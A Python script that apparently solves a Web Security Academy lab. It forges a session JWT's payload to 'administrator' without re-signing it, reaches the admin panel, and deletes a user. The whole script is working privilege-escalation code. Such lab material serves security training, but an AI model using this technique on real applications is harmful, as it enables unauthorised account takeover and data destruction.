import requests, base64, json
from bs4 import BeautifulSoup

s = requests.Session()
site = '0ab20080035aa6b58cab09f700610070.web-security-academy.net'
login_url = f'https://{site}/login'
admin_url = f'https://{site}/admin'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data = logindata) # log in to get jwt with csrf token

jwt = s.cookies.get("session") # jwt is in the session cookie, we can use it to access the admin page

# edit jwt to change role/sub to admin
header, payload, signature = jwt.split('.')
decoded_payload = json.loads(base64.urlsafe_b64decode(payload + '==').decode('utf-8')) # decode the payload to get the json object
decoded_payload['role'] = 'admin' # change the role to admin
decoded_payload['sub'] = 'administrator' # change the sub to administrator
new_payload = base64.urlsafe_b64encode(json.dumps(decoded_payload).encode()).decode().rstrip('=') # encode the new payload and remove the padding
new_jwt = f'{header}.{new_payload}.{signature}' # create the new jwt with the same header and signature but the new payload 
print (f'Edited JWT: {new_jwt}')

# log in to admin page
resp = s.get(admin_url, headers = {'Cookie' : f'session={new_jwt}'}) # access admin page with edited jwt

# find carlos delete link and delete carlos
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']

s.get(f'https://{site}{delete_uri}', headers = {'Cookie' : f'session={new_jwt}'}) # delete carlos
